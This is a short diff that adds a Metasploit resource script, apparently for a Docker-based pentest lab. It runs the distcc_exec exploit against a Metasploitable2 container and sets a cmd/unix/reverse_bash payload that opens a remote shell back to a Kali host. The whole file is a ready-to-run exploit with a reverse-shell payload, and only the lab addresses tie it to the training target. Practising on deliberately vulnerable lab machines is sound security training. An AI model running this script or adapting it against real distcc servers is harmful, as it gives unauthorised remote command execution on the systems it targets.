@@ -1,0 +1,12 @@
+# Metasploitable2 DistCC - One-shot exploit
+# Run: msfconsole -q -r ~/.msf4/scripts/pwn-distcc.rc
+#
+# Prerequisites:
+#   - metasploitable2 container running (docker compose up -d metasploitable2)
+#   - Kali on 172.20.0.5
+
+use exploit/unix/misc/distcc_exec
+set RHOSTS 172.20.0.20
+set LHOST 172.20.0.5
+set PAYLOAD cmd/unix/reverse_bash
+exploit
